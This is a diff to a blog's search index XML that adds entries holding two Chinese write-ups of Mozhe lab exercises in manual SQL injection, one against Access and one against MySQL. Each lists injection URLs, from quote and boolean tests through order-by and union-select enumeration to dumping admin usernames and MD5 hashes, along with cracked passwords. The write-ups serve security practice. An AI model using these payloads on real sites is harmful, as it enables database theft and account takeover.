@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[墨者-SQL手工注入漏洞测试(Access数据库)]]></title>
+    <url>%2F2019%2F07%2F30%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-Access%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
+    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境IIS+ASP+Access，Aspx代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 存在漏洞的链接 1http://mozhe.cn/new_list.asp?id=1 注入点检测基于报错的检测1http://mozhe.cn/new_list.asp?id=1&apos; 页面返回不正常，可能存在SQL注入 基于布尔的检测12http://mozhe.cn/new_list.asp?id=1 and 1=1http://mozhe.cn/new_list.asp?id=1 and 1=2 通过页面结果，该链接确实存在SQL注入漏洞 判断selet字段数12http://mozhe.cn/new_list.asp?id=1 order by 4 //显示正常http://mozhe.cn/new_list.asp?id=1 order by 5 //显示不正常 判断出select中有4个字段数 猜解数据库的表名1http:/mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from table1 可以通过手动或自动化工具更换‘table1’，猜解存在的表名发现admin表 并且发现显示的字段位置在2，3 猜解数据库列名1http://mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from admin 将任意一个数字更换成列名，如果列名存在，则正常显示有时候，可以直接得到表中的数据 发现username、id、passwd等列字段 爆出账号密码1http://mozhe.cn/new_list.asp?id=1 union select 1,username,passwd,4 from admin 账号：moke密码：7e6ec4fadf84938f 密码是md5加密，通过在线破解后，就可以登陆后台拿到key值]]></content>
+      <categories>
+        <category>靶场实战</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[墨者-SQL手工注入漏洞测试(MySQL数据库)]]></title>
     <url>%2F2019%2F07%2F29%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
     <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 检测SQL注入点发现一个维护公告链接 基于报错的检测先在链接后的id=1加入 ‘，查看页面反应发现页面没有任何显示，可能存在SQL注入 基于布尔值判断12http://mozhe.cn/new_list.php?id=1 and 1=1 正常显示http://mozhe.cn/new_list.php?id=1 and 1=2 不正常显示 那么可以判段存在SQL注入 判断select字段个数12http://mozhe.cn/new_list.php?id=1 order by 4http://mozhe.cn/new_list.php?id=1 order by 5 当order by语句中数值大于4，页面不显示，说明select语句中有4个字段 查询数据库信息先判断页面中会显示的字段位置 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,3,4 判断出2，3字段的位置会在页面显示，因此可以开始构造sql语句了 查询数据库名，版本 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,database(),version(),4 数据库名：mozhe_Discuz_StormGroup版本： 5.7.22-0ubuntu0.16.04.1 这里也可以用CONCAT_WS函数 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4 获取数据库名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_schema,4 from information_schema.tables limit 1,1 通过修改limit值获得所有数据库名称获得5个数据库名称information_schema、 mozhe_Discuz_StormGroup、 mysql、 performance_schmozhe.cn 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_name,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 mozhe_Discuz_StormGroup库的表名：StormGroup_member、 notice 获取数据库列名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,column_name,4 from information_schema.columns where table_schema=&apos;mozhe_Discuz_StormGroup&apos; and table_name=&apos;StormGroup_member&apos; limit 0,1 StormGroup_member表的列名： id、 name、 password、 status 获取字段内容（账号密码）1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,name,password,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1 账号密码（MD5在线破解）mozhe 356f589a7df439f6f744ff19bb8092c0 —-dsan13mozhe c0b11cc529cd469efe3c3333e2bcc3db —-346753 登陆后台获取key]]></content>
